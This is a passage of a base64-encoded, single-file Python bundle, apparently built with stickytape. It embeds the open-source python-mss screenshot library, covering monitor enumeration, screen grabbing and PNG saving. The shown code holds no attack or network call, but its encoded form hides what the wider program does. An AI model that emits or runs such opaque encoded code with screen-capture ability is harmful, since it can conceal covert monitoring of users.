ImRhcndpbiI6XG4gICAgICAgIGZyb20gLiBpbXBvcnQgZGFyd2luXG5cbiAgICAgICAgcmV0dXJuIGRhcndpbi5NU1MoKiprd2FyZ3MpXG5cbiAgICBpZiBvc18gPT0gImxpbnV4IjpcbiAgICAgICAgZnJvbSAuIGltcG9ydCBsaW51eFxuXG4gICAgICAgIHJldHVybiBsaW51eC5NU1MoKiprd2FyZ3MpXG5cbiAgICBpZiBvc18gPT0gIndpbmRvd3MiOlxuICAgICAgICBmcm9tIC4gaW1wb3J0IHdpbmRvd3NcblxuICAgICAgICByZXR1cm4gd2luZG93cy5NU1MoKiprd2FyZ3MpXG5cbiAgICByYWlzZSBTY3JlZW5TaG90RXJyb3IoIlN5c3RlbSB7IXJ9IG5vdCAoeWV0PykgaW1wbGVtZW50ZWQuIi5mb3JtYXQob3NfKSlcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdtc3MvYmFzZS5weScsIGInIiIiXG5UaGlzIGlzIHBhcnQgb2YgdGhlIE1TUyBQeXRob25cJ3MgbW9kdWxlLlxuU291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vQm9ib1RpRy9weXRob24tbXNzXG4iIiJcblxuZnJvbSBhYmMgaW1wb3J0IEFCQ01ldGEsIGFic3RyYWN0bWV0aG9kXG5mcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZVxuZnJvbSB0eXBpbmcgaW1wb3J0IFRZUEVfQ0hFQ0tJTkdcbmZyb20gdGhyZWFkaW5nIGltcG9ydCBMb2NrXG5cbmZyb20gLmV4Y2VwdGlvbiBpbXBvcnQgU2NyZWVuU2hvdEVycm9yXG5mcm9tIC5zY3JlZW5zaG90IGltcG9ydCBTY3JlZW5TaG90XG5mcm9tIC50b29scyBpbXBvcnQgdG9fcG5nXG5cbmlmIFRZUEVfQ0hFQ0tJTkc6XG4gICAgIyBweWxpbnQ6IGRpc2FibGU9dW5ncm91cGVkLWltcG9ydHNcbiAgICBmcm9tIHR5cGluZyBpbXBvcnQgQW55LCBDYWxsYWJsZSwgSXRlcmF0b3IsIExpc3QsIE9wdGlvbmFsLCBUeXBlICAjIG5vcWFcblxuICAgIGZyb20gLm1vZGVscyBpbXBvcnQgTW9uaXRvciwgTW9uaXRvcnMgICMgbm9xYVxuXG5cbmxvY2sgPSBMb2NrKClcblxuXG5jbGFzcyBNU1NCYXNlKG1ldGFjbGFzcz1BQkNNZXRhKTpcbiAgICAiIiIgVGhpcyBjbGFzcyB3aWxsIGJlIG92ZXJsb2FkZWQgYnkgYSBzeXN0ZW0gc3BlY2lmaWMgb25lLiAiIiJcblxuICAgIF9fc2xvdHNfXyA9IHsiX21vbml0b3JzIiwgImNsc19pbWFnZSIsICJjb21wcmVzc2lvbl9sZXZlbCJ9XG5cbiAgICBkZWYgX19pbml0X18oc2VsZik6XG4gICAgICAgIHNlbGYuY2xzX2ltYWdlID0gU2NyZWVuU2hvdCAgIyB0eXBlOiBUeXBlW1NjcmVlblNob3RdXG4gICAgICAgIHNlbGYuY29tcHJlc3Npb25fbGV2ZWwgPSA2XG4gICAgICAgIHNlbGYuX21vbml0b3JzID0gW10gICMgdHlwZTogTW9uaXRvcnNcblxuICAgIGRlZiBfX2VudGVyX18oc2VsZik6XG4gICAgICAgICMgdHlwZTogKCkgLT4gTVNTQmFzZVxuICAgICAgICAiIiIgRm9yIHRoZSBjb29sIGNhbGwgYHdpdGggTVNTKCkgYXMgbXNzOmAuICIiIlxuXG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBkZWYgX19leGl0X18oc2VsZiwgKl8pOlxuICAgICAgICAiIiIgRm9yIHRoZSBjb29sIGNhbGwgYHdpdGggTVNTKCkgYXMgbXNzOmAuICIiIlxuXG4gICAgICAgIHNlbGYuY2xvc2UoKVxuXG4gICAgQGFic3RyYWN0bWV0aG9kXG4gICAgZGVmIF9ncmFiX2ltcGwoc2VsZiwgbW9uaXRvcik6XG4gICAgICAgICMgdHlwZTogKE1vbml0b3IpIC0+IFNjcmVlblNob3RcbiAgICAgICAgIiIiXG4gICAgICAgIFJldHJpZXZlIGFsbCBwaXhlbHMgZnJvbSBhIG1vbml0b3IuIFBpeGVscyBoYXZlIHRvIGJlIFJHQi5cbiAgICAgICAgVGhhdCBtZXRob2QgaGFzIHRvIGJlIHJ1biB1c2luZyBhIHRocmVhZGluZyBsb2NrLlxuICAgICAgICAiIiJcblxuICAgIEBhYnN0cmFjdG1ldGhvZFxuICAgIGRlZiBfbW9uaXRvcnNfaW1wbChzZWxmKTpcbiAgICAgICAgIyB0eXBlOiAoKSAtPiBOb25lXG4gICAgICAgICIiIlxuICAgICAgICBHZXQgcG9zaXRpb25zIG9mIG1vbml0b3JzIChoYXMgdG8gYmUgcnVuIHVzaW5nIGEgdGhyZWFkaW5nIGxvY2spLlxuICAgICAgICBJdCBtdXN0IHBvcHVsYXRlIHNlbGYuX21vbml0b3JzLlxuICAgICAgICAiIiJcblxuICAgIGRlZiBjbG9zZShzZWxmKTpcbiAgICAgICAgIyB0eXBlOiAoKSAtPiBOb25lXG4gICAgICAgICIiIiBDbGVhbi11cC4gIiIiXG5cbiAgICBkZWYgZ3JhYihzZWxmLCBtb25pdG9yKTpcbiAgICAgICAgIyB0eXBlOiAoTW9uaXRvcikgLT4gU2NyZWVuU2hvdFxuICAgICAgICAiIiJcbiAgICAgICAgUmV0cmlldmUgc2NyZWVuIHBpeGVscyBmb3IgYSBnaXZlbiBtb25pdG9yLlxuXG4gICAgICAgIE5vdGU6ICptb25pdG9yKiBjYW4gYmUgYSB0dXBsZSBsaWtlIFBJTC5JbWFnZS5ncmFiKCkgYWNjZXB0cy5cblxuICAgICAgICA6cGFyYW0gbW9uaXRvcjogVGhlIGNvb3JkaW5hdGVzIGFuZCBzaXplIG9mIHRoZSBib3ggdG8gY2FwdHVyZS5cbiAgICAgICAgICAgICAgICAgICAgICAgIFNlZSA6bWV0aDpgbW9uaXRvcnMgPG1vbml0b3JzPmAgZm9yIG9iamVjdCBkZXRhaWxzLlxuICAgICAgICA6cmV0dXJuIDpjbGFzczpgU2NyZWVuU2hvdCA8U2NyZWVuU2hvdD5gLlxuICAgICAgICAiIiJcblxuICAgICAgICAjIENvbnZlcnQgUElMIGJib3ggc3R5bGVcbiAgICAgICAgaWYgaXNpbnN0YW5jZShtb25pdG9yLCB0dXBsZSk6XG4gICAgICAgICAgICBtb25pdG9yID0ge1xuICAgICAgICAgICAgICAgICJsZWZ0IjogbW9uaXRvclswXSxcbiAgICAgICAgICAgICAgICAidG9wIjogbW9uaXRvclsxXSxcbiAgICAgICAgICAgICAgICAid2lkdGgiOiBtb25pdG9yWzJdIC0gbW9uaXRvclswXSxcbiAgICAgICAgICAgICAgICAiaGVpZ2h0IjogbW9uaXRvclszXSAtIG1vbml0b3JbMV0sXG4gICAgICAgICAgICB9XG5cbiAgICAgICAgd2l0aCBsb2NrOlxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2dyYWJfaW1wbChtb25pdG9yKVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIG1vbml0b3JzKHNlbGYpOlxuICAgICAgICAjIHR5cGU6ICgpIC0+IE1vbml0b3JzXG4gICAgICAgICIiIlxuICAgICAgICBHZXQgcG9zaXRpb25zIG9mIGFsbCBtb25pdG9ycy5cbiAgICAgICAgSWYgdGhlIG1vbml0b3IgaGFzIHJvdGF0aW9uLCB5b3UgaGF2ZSB0byBkZWFsIHdpdGggaXRcbiAgICAgICAgaW5zaWRlIHRoaXMgbWV0aG9kLlxuXG4gICAgICAgIFRoaXMgbWV0aG9kIGhhcyB0byBmaWxsIHNlbGYuX21vbml0b3JzIHdpdGggYWxsIGluZm9ybWF0aW9uXG4gICAgICAgIGFuZCB1c2UgaXQgYXMgYSBjYWNoZTpcbiAgICAgICAgICAgIHNlbGYuX21vbml0b3JzWzBdIGlzIGEgZGljdCBvZiBhbGwgbW9uaXRvcnMgdG9nZXRoZXJcbiAgICAgICAgICAgIHNlbGYuX21vbml0b3JzW05dIGlzIGEgZGljdCBvZiB0aGUgbW9uaXRvciBOICh3aXRoIE4gPiAwKVxuXG4gICAgICAgIEVhY2ggbW9uaXRvciBpcyBhIGRpY3Qgd2l0aDpcbiAgICAgICAge1xuICAgICAgICAgICAgXCdsZWZ0XCc6ICAgdGhlIHgtY29vcmRpbmF0ZSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIsXG4gICAgICAgICAgICBcJ3RvcFwnOiAgICB0aGUgeS1jb29yZGluYXRlIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lcixcbiAgICAgICAgICAgIFwnd2lkdGhcJzogIHRoZSB3aWR0aCxcbiAgICAgICAgICAgIFwnaGVpZ2h0XCc6IHRoZSBoZWlnaHRcbiAgICAgICAgfVxuICAgICAgICAiIiJcblxuICAgICAgICBpZiBub3Qgc2VsZi5fbW9uaXRvcnM6XG4gICAgICAgICAgICB3aXRoIGxvY2s6XG4gICAgICAgICAgICAgICAgc2VsZi5fbW9uaXRvcnNfaW1wbCgpXG5cbiAgICAgICAgcmV0dXJuIHNlbGYuX21vbml0b3JzXG5cbiAgICBkZWYgc2F2ZShzZWxmLCBtb249MCwgb3V0cHV0PSJtb25pdG9yLXttb259LnBuZyIsIGNhbGxiYWNrPU5vbmUpOlxuICAgICAgICAjIHR5cGU6IChpbnQsIHN0ciwgQ2FsbGFibGVbW3N0cl0sIE5vbmVdKSAtPiBJdGVyYXRvcltzdHJdXG4gICAgICAgICIiIlxuICAgICAgICBHcmFiIGEgc2NyZWVuIHNob3QgYW5kIHNhdmUgaXQgdG8gYSBmaWxlLlxuXG4gICAgICAgIDpwYXJhbSBpbnQgbW9uOiBUaGUgbW9uaXRvciB0byBzY3JlZW4gc2hvdCAoZGVmYXVsdD0wKS5cbiAgICAgICAgICAgICAgICAgICAgICAgIC0xOiBncmFiIG9uZSBzY3JlZW4gc2hvdCBvZiBhbGwgbW9uaXRvcnNcbiAgICAgICAgICAgICAgICAgICAgICAgICAwOiBncmFiIG9uZSBzY3JlZW4gc2hvdCBieSBtb25pdG9yXG4gICAgICAgICAgICAgICAgICAgICAgICBOOiBncmFiIHRoZSBzY3JlZW4gc2hvdCBvZiB0aGUgbW9uaXRvciBOXG5cbiAgICAgICAgOnBhcmFtIHN0ciBvdXRwdXQ6IFRoZSBvdXRwdXQgZmlsZW5hbWUuXG5cbiAgICAgICAgICAgIEl0IGNhbiB0YWtlIHNldmVyYWwga2V5d29yZHMgdG8gY3VzdG9taXplIHRoZSBmaWxlbmFtZTpcbiAgICAgICAgICAgIC0gYHttb259YDogdGhlIG1vbml0b3IgbnVtYmVyXG4gICAgICAgICAgICAtIGB7dG9wfWA6IHRoZSBzY3JlZW4gc2hvdCB5LWNvb3JkaW5hdGUgb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyXG4gICAgICAgICAgICAtIGB7bGVmdH1gOiB0aGUgc2NyZWVuIHNob3QgeC1jb29yZGluYXRlIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lclxuICAgICAgICAgICAgLSBge3dpZHRofWA6IHRoZSBzY3JlZW4gc2hvdFwncyB3aWR0aFxuICAgICAgICAgICAgLSBge2hlaWdodH1gOiB0aGUgc2NyZWVuIHNob3RcJ3MgaGVpZ2h0XG4gICAgICAgICAgICAtIGB7ZGF0ZX1gOiB0aGUgY3VycmVudCBkYXRlIHVzaW5nIHRoZSBkZWZhdWx0IGZvcm1hdHRlclxuXG4gICAgICAgICAgICBBcyBpdCBpcyB1c2luZyB0aGUgYGZvcm1hdCgpYCBmdW5jdGlvbiwgeW91IGNhbiBzcGVjaWZ5XG4gICAgICAgICAgICBmb3JtYXR0aW5nIG9wdGlvbnMgbGlrZSBge2RhdGU6JVktJW0tJXN9YC5cblxuICAgICAgICA6cGFyYW0gY2FsbGFibGUgY2FsbGJhY2s6IENhbGxiYWNrIGNhbGxlZCBiZWZvcmUgc2F2aW5nIHRoZVxuICAgICAgICAgICAgc2NyZWVuIHNob3QgdG8gYSBmaWxlLiAgVGFrZSB0aGUgYG91dHB1dGAgYXJndW1lbnQgYXMgcGFyYW1ldGVyLlxuXG4gICAgICAgIDpyZXR1cm4gZ2VuZXJhdG9yOiBDcmVhdGVkIGZpbGUocykuXG4gICAgICAgICIiIlxuXG4gICAgICAgIG1vbml0b3JzID0gc2VsZi5tb25pdG9yc1xuICAgICAgICBpZiBub3QgbW9uaXRvcnM6XG4gICAgICAgICAgICByYWlzZSBTY3JlZW5TaG90RXJyb3IoIk5vIG1vbml0b3IgZm91bmQuIilcblxuICAgICAgICBpZiBtb24gPT0gMDpcbiAgICAgICAgICAgICMgT25lIHNjcmVlbiBzaG90IGJ5IG1vbml0b3JcbiAgICAgICAgICAgIGZvciBpZHgsIG1vbml0b3IgaW4gZW51bWVyYXRlKG1vbml0b3JzWzE6XSwgMSk6XG4gICAgICAgICAgICAgICAgZm5hbWUgPSBvdXRwdXQuZm9ybWF0KG1vbj1pZHgsIGRhdGU9ZGF0ZXRpbWUubm93KCksICoqbW9uaXRvcilcbiAgICAgICAgICAgICAgICBpZiBjYWxsYWJsZShjYWxsYmFjayk6XG4gICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKGZuYW1lKVxuICAgICAgICAgICAgICAgIHNjdCA9IHNlbGYuZ3JhYihtb25pdG9yKVxuICAgICAgICAgICAgICAgIHRvX3BuZyhzY3QucmdiLCBzY3Quc2l6ZSwgbGV2ZWw9c2VsZi5jb21wcmVzc2lvbl9sZXZlbCwgb3V0cHV0PWZuYW1lKVxuICAgICAgICAgICAgICAgIHlpZWxkIGZuYW1lXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICAjIEEgc2NyZWVuIHNob3Qgb2YgYWxsIG1vbml0b3JzIHRvZ2V0aGVyIG9yXG4gICAgICAgICAgICAjIGEgc2NyZWVuIHNob3Qgb2YgdGhlIG1vbml0b3IgTi5cbiAgICAgICAgICAgIG1vbiA9IDAgaWYgbW9uID09IC0xIGVsc2UgbW9uXG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgbW9uaXRvciA9IG1vbml0b3JzW21vbl1cbiAgICAgICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOlxuICAgICAgICAgICAgICAgICMgcHlsaW50OiBkaXNhYmxlPXJhaXNlLW1pc3NpbmctZnJvbVxuICAgICAgICAgICAgICAgIHJhaXNlIFNjcmVlblNob3RFcnJvcigiTW9uaXRvciB7IXJ9IGRvZXMgbm90IGV4aXN0LiIuZm9ybWF0KG1vbikpXG5cbiAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dC5mb3JtYXQobW9uPW1vbiwgZGF0ZT1kYXRldGltZS5ub3coKSwgKiptb25pdG9yKVxuICAgICAgICAgICAgaWYgY2FsbGFibGUoY2FsbGJhY2spOlxuICAgICAgICAgICAgICAgIGNhbGxiYWNrKG91dHB1dClcbiAgICAgICAgICAgIHNjdCA9IHNlbGYuZ3JhYihtb25pdG9yKVxuICAgICAgICAgICAgdG9fcG5nKHNjdC5yZ2IsIHNjdC5zaXplLCBsZXZlbD1zZWxmLmNvbXByZXNzaW9uX2xldmVsLCBvdXRwdXQ9b3V0cHV0KVxuICAgICAgICAgICAgeWllbGQgb3V0cHV0XG5cbiAgICBkZWYgc2hvdChzZWxmLCAqKmt3YXJncyk6XG4gICAgICAgICMgdHlwZTogKEFueSkgLT4gc3RyXG4gICAgICAgICIiIlxuICAgICAgICBIZWxwZXIgdG8gc2F2ZSB0aGUgc2NyZWVuIHNob3Qgb2YgdGhlIDFzdCBtb25pdG9yLCBieSBkZWZhdWx0LlxuICAgICAgICBZb3UgY2FuIHBhc3MgdGhlIHNhbWUgYXJndW1lbnRzIGFzIGZvciBgYHNhdmVgYC5cbiAgICAgICAgIiIiXG5cbiAgICAgICAga3dhcmdzWyJtb24iXSA9IGt3YXJncy5nZXQoIm1vbiIsIDEpXG4gICAgICAgIHJldHVybiBuZXh0KHNlbGYuc2F2ZSgqKmt3YXJncykpXG5cbiAgICBAc3RhdGljbWV0aG9kXG4gICAgZGVmIF9jZmFjdG9yeShhdHRyLCBmdW5jLCBhcmd0eXBlcywgcmVzdHlwZSwgZXJyY2hlY2s9Tm9uZSk6XG4gICAgICAgICMgdHlwZTogKEFueSwgc3RyLCBMaXN0W0FueV0sIEFueSwgT3B0aW9uYWxbQ2FsbGFibGVdKSAtPiBOb25lXG4gICAgICAgICIiIiBGYWN0b3J5IHRvIGNyZWF0ZSBhIGN0eXBlcyBmdW5jdGlvbiBhbmQgYXV0b21hdGljYWxseSBtYW5hZ2UgZXJyb3JzLiAiIiJcblxuICAgICAgICBtZXRoID0gZ2V0YXR0cihhdHRyLCBmdW5jKVxuICAgICAgICBtZXRoLmFyZ3R5cGVzID0gYXJndHlwZXNcbiAgICAgICAgbWV0aC5yZXN0eXBlID0gcmVzdHlwZVxuICAgICAgICBpZiBlcnJjaGVjazpcbiAgICAgICAgICAgIG1ldGguZXJyY2hlY2sgPSBlcnJjaGVja1xuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ21zcy9zY3JlZW5zaG90LnB5JywgYiciIiJcblRoaXMgaXMgcGFydCBvZiB0aGUgTVNTIFB5dGhvblwncyBtb2R1bGUuXG5Tb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9Cb2JvVGlHL3B5dGhvbi1tc3NcbiIiIlxuXG5mcm9tIHR5cGluZyBpbXBvcnQgVFlQRV9DSEVDS0lOR1xuXG5mcm9tIC5tb2RlbHMgaW1wb3J0IFNpemUsIFBvc1xuZnJvbSAuZXhjZXB0aW9uIGltcG9ydCBTY3JlZW5TaG90RXJyb3JcblxuaWYgVFlQRV9DSEVDS0lORzpcbiAgICBmcm9tIHR5cGluZyBpbXBvcnQgQW55LCBEaWN0LCBJdGVyYXRvciwgT3B0aW9uYWwgICMgbm9xYVxuXG4gICAgZnJvbSAubW9kZWxzIGltcG9ydCBNb25pdG9yLCBQaXhlbCwgUGl4ZWxzICAjIG5vcWFcblxuXG5jbGFzcyBTY3JlZW5TaG90OlxuICAgICIiIlxuICAgIFNjcmVlbiBzaG90IG9iamVjdC5cblxuICAgIC4uIG5vdGU6OlxuXG4gICAgICAgIEEgYmV0dGVyIG5hbWUgd291bGQgaGF2ZSAgYmVlbiAqSW1hZ2UqLCBidXQgdG8gcHJldmVudCBjb2xsaXNpb25zXG4gICAgICAgIHdpdGggUElMLkltYWdlLCBpdCBoYXMgYmVlbiBkZWNpZGVkIHRvIHVzZSAqU2NyZWVuU2hvdCouXG4gICAgIiIiXG5cbiAgICBfX3Nsb3RzX18gPSB7Il9fcGl4ZWxzIiwgIl9fcmdiIiwgInBvcyIsICJyYXciLCAic2l6ZSJ9XG5cbiAgICBkZWYgX19pbml0X18oc2VsZiwgZGF0YSwgbW9uaXRvciwgc2l6ZT1Ob25lKTpcbiAgICAgICAgIyB0eXBlOiAoYnl0ZWFycmF5LCBNb25pdG9yLCBPcHRpb25hbFtTaXplXSkgLT4gTm9uZVxuXG4gICAgICAgIHNlbGYuX19waXhlbHMgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW1BpeGVsc11cbiAgICAgICAgc2VsZi5fX3JnYiA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbYnl0ZXNdXG5cbiAgICAgICAgIzogQnl0ZWFycmF5IG9mIHRoZSByYXcgQkdSQSBwaXhlbHMgcmV0cmlldmVkIGJ5IGN0eXBlc1xuICAgICAgICAjOiBPUyBpbmRlcGVuZGVudCBpbXBsZW1lbnRhdGlvbnMuXG4gICAgICAgIHNlbGYucmF3ID0gZGF0YVxuXG4gICAgICAgICM6IE5hbWVkVHVwbGUgb2YgdGhlIHNjcmVlbiBzaG90IGNvb3JkaW5hdGVzLlxuICAgICAgICBzZWxmLnBvcyA9IFBvcyhtb25pdG9yWyJsZWZ0Il0sIG1vbml0b3JbInRvcCJdKVxuXG4gICAgICAgIGlmIHNpemUgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICAjOiBOYW1lZFR1cGxlIG9mIHRoZSBzY3JlZW4gc2hvdCBzaXplLlxuICAgICAgICAgICAgc2VsZi5zaXplID0gc2l6ZVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgc2VsZi5zaXplID0gU2l6ZShtb25pdG9yWyJ3aWR0aCJdLCBtb25pdG9yWyJoZWlnaHQiXSlcblxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuICgiPHshc30gcG9zPXtjbHMubGVmdH0se2Nscy50b3B9IHNpemU9e2Nscy53aWR0aH14e2Nscy5oZWlnaHR9PiIpLmZvcm1hdChcbiAgICAgICAgICAgIHR5cGUoc2VsZikuX19uYW1lX18sIGNscz1zZWxmXG4gICAgICAgIClcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBfX2FycmF5X2ludGVyZmFjZV9fKHNlbGYpOlxuICAgICAgICAjIHR5cGU6ICgpIC0+IERpY3Rbc3RyLCBBbnldXG4gICAgICAgICIiIlxuICAgICAgICBOdW1weSBhcnJheSBpbnRlcmZhY2Ugc3VwcG9ydC5cbiAgICAgICAgSXQgdXNlcyByYXcgZGF0YSBpbiBCR1JBIGZvcm0uXG5cbiAgICAgICAgU2VlIGh0dHBzOi8vZG9jcy5zY2lweS5vcmcvZG9jL251bXB5L3JlZmVyZW5jZS9hcnJheXMuaW50ZXJmYWNlLmh0bWxcbiAgICAgICAgIiIiXG5cbiAgICAgICAgcmV0dXJuIHtcbiAgICAgICAgICAgICJ2ZXJzaW9uIjogMyxcbiAgICAgICAgICAgICJzaGFwZSI6IChzZWxmLmhlaWdodCwgc2VsZi53aWR0aCwgNCksXG4gICAgICAgICAgICAidHlwZXN0ciI6ICJ8dTEiLFxuICAgICAgICAgICAgImRhdGEiOiBzZWxmLnJhdyxcbiAgICAgICAgfVxuXG4gICAgQGNsYXNzbWV0aG9kXG4gICAgZGVmIGZyb21fc2l6ZShjbHMsIGRhdGEsIHdpZHRoLCBoZWlnaHQpOlxuICAgICAgICAjIHR5cGU6IChieXRlYXJyYXksIGludCwgaW50KSAtPiBTY3JlZW5TaG90XG4gICAgICAgICIiIiBJbnN0YW50aWF0ZSBhIG5ldyBjbGFzcyBnaXZlbiBvbmx5IHNjcmVlbiBzaG90XCdzIGRhdGEgYW5kIHNpemUuICIiIlxuXG4gICAgICAgIG1vbml0b3IgPSB7ImxlZnQiOiAwLCAidG9wIjogMCwgIndpZHRoIjogd2lkdGgsICJoZWlnaHQiOiBoZWlnaHR9XG4gICAgICAgIHJldHVybiBjbHMoZGF0YSwgbW9uaXRvcilcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBiZ3JhKHNlbGYpOlxuICAgICAgICAjIHR5cGU6ICgpIC0+IGJ5dGVzXG4gICAgICAgICIiIiBCR1JBIHZhbHVlcyBmcm9tIHRoZSBCR1JBIHJhdyBwaXhlbHMuICIiIlxuICAgICAgICByZXR1cm4gYnl0ZXMoc2VsZi5yYXcpXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgaGVpZ2h0KHNlbGYpOlxuICAgICAgICAjIHR5cGU6ICgpIC0+IGludFxuICAgICAgICAiIiIgQ29udmVuaWVudCBhY2Nlc3NvciB0byB0aGUgaGVpZ2h0IHNpemUuICIiIlxuICAgICAgICByZXR1cm4gc2VsZi5zaXplLmhlaWdodFxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGxlZnQoc2VsZik6XG4gICAgICAgICMgdHlwZTogKCkgLT4gaW50XG4gICAgICAgICIiIiBDb252ZW5pZW50IGFjY2Vzc29yIHRvIHRoZSBsZWZ0IHBvc2l0aW9uLiAiIiJcbiAgICAgICAgcmV0dXJuIHNlbGYucG9zLmxlZnRcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBwaXhlbHMoc2VsZik6XG4gICAgICAgICMgdHlwZTogKCkgLT4gUGl4ZWxzXG4gICAgICAgICIiIlxuICAgICAgICA6cmV0dXJuIGxpc3Q6IFJHQiB0dXBsZXMuXG4gICAgICAgICIiIlxuXG4gICAgICAgIGlmIG5vdCBzZWxmLl9fcGl4ZWxzOlxuICAgICAgICAgICAgcmdiX3R1cGxlcyA9IHppcChcbiAgICAgICAgICAgICAgICBzZWxmLnJhd1syOjo0XSwgc2VsZi5yYXdbMTo6NF0sIHNlbGYucmF3WzA6OjRdXG4gICAgICAgICAgICApICAjIHR5cGU6IEl0ZXJhdG9yW1BpeGVsXVxuICAgICAgICAgICAgc2VsZi5fX3BpeGVscyA9IGxpc3QoemlwKCpbaXRlcihyZ2JfdHVwbGVzKV0gKiBzZWxmLndpZHRoKSkgICMgdHlwZTogaWdub3JlXG5cbiAgICAgICAgcmV0dXJuIHNlbGYuX19waXhlbHNcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiByZ2Ioc2VsZik6XG4gICAgICAgICMgdHlwZTogKCkgLT4gYnl0ZXNcbiAgICAgICAgIiIiXG4gICAgICAgIENvbXB1dGUgUkdCIHZhbHVlcyBmcm9tIHRoZSBCR1JBIHJhdyBwaXhlbHMuXG5cbiAgICAgICAgOnJldHVybiBieXRlczogUkdCIHBpeGVscy5cbiAgICAgICAgIiIiXG5cbiAgICAgICAgaWYgbm90IHNlbGYuX19yZ2I6XG4gICAgICAgICAgICByZ2IgPSBieXRlYXJyYXkoc2VsZi5oZWlnaHQgKiBzZWxmLndpZHRoICogMylcbiAgICAgICAgICAgIHJhdyA9IHNlbGYucmF3XG4gICAgICAgICAgICByZ2JbMDo6M10gPSByYXdbMjo6NF1cbiAgICAgICAgICAgIHJnYlsxOjozXSA9IHJhd1sxOjo0XVxuICAgICAgICAgICAgcmdiWzI6OjNdID0gcmF3WzA6OjRdXG4gICAgICAgICAgICBzZWxmLl9fcmdiID0gYnl0ZXMocmdiKVxuXG4gICAgICAgIHJldHVybiBzZWxmLl9fcmdiXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgdG9wKHNlbGYpOlxuICAgICAgICAjIHR5cGU6ICgpIC0+IGludFxuICAgICAgICAiIiIgQ29udmVuaWVudCBhY2Nlc3NvciB0byB0aGUgdG9wIHBvc2l0aW9uLiAiIiJcbiAgICAgICAgcmV0dXJuIHNlbGYucG9zLnRvcFxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIHdpZHRoKHNlbGYpOlxuICAgICAgICAjIHR5cGU6ICgpIC0+IGludFxuICAgICAgICAiIiIgQ29udmVuaWVudCBhY2Nlc3NvciB0byB0aGUgd2lkdGggc2l6ZS4gIiIiXG4gICAgICAgIHJldHVybiBzZWxmLnNpemUud2lkdGhcblxuICAgIGRlZiBwaXhlbChzZWxmLCBjb29yZF94LCBjb29yZF95KTpcbiAgICAgICAgIyB0eXBlOiAoaW50LCBpbnQpIC0+IFBpeGVsXG4gICAgICAgICIiIlxuICAgICAgICBSZXR1cm5zIHRoZSBwaXhlbCB2YWx1ZSBhdCBhIGdpdmVuIHBvc2l0aW9uLlxuXG4gICAgICAgIDpwYXJhbSBpbnQgY29vcmRfeDogVGhlIHggY29vcmRpbmF0ZS5cbiAgICAgICAgOnBhcmFtIGludCBjb29yZF95OiBUaGUgeSBjb29yZGluYXRlLlxuICAgICAgICA6cmV0dXJuIHR1cGxlOiBUaGUgcGl4ZWwgdmFsdWUgYXMgKFIsIEcsIEIpLlxuICAgICAgICAiIiJcblxuICAgICAgICB0cnk6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5waXhlbHNbY29vcmRfeV1bY29vcmRfeF0gICMgdHlwZTogaWdub3JlXG4gICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOlxuICAgICAgICAgICAgIyBweWxpbnQ6IGRpc2FibGU9cmFpc2UtbWlzc2luZy1mcm9tXG4gICAgICAgICAgICByYWlzZSBTY3JlZW5TaG90RXJyb3IoXG4gICAgICAgICAgICAgICAgIlBpeGVsIGxvY2F0aW9uICh7fSwge30pIGlzIG91dCBvZiByYW5nZS4iLmZvcm1hdChjb29yZF94LCBjb29yZF95KVxuICAgICAgICAgICAgKVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ21zcy9tb2RlbHMucHknLCBiJyIiIlxuVGhpcyBpcyBwYXJ0IG9mIHRoZSBNU1MgUHl0aG9uXCdzIG1vZHVsZS5cblNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL0JvYm9UaUcvcHl0aG9uLW1zc1xuIiIiXG5cbmltcG9ydCBjb2xsZWN0aW9uc1xuZnJvbSB0eXBpbmcgaW1wb3J0IERpY3QsIExpc3QsIFR1cGxlXG5cblxuTW9uaXRvciA9IERpY3Rbc3RyLCBpbnRdXG5Nb25pdG9ycyA9IExpc3RbTW9uaXRvcl1cblxuUGl4ZWwgPSBUdXBsZVtpbnQsIGludCwgaW50XVxuUGl4ZWxzID0gTGlzdFtQaXhlbF1cblxuUG9zID0gY29sbGVjdGlvbnMubmFtZWR0dXBsZSgiUG9zIiwgImxlZnQsIHRvcCIpXG5TaXplID0gY29sbGVjdGlvbnMubmFtZWR0dXBsZSgiU2l6ZSIsICJ3aWR0aCwgaGVpZ2h0IilcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdtc3MvdG9vbHMucHknLCBiJyIiIlxuVGhpcyBpcyBwYXJ0IG9mIHRoZSBNU1MgUHl0aG9uXCdzIG1vZHVsZS5cblNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL0JvYm9UaUcvcHl0aG9uLW1zc1xuIiIiXG5cbmltcG9ydCBvc1xuaW1wb3J0IHN0cnVjd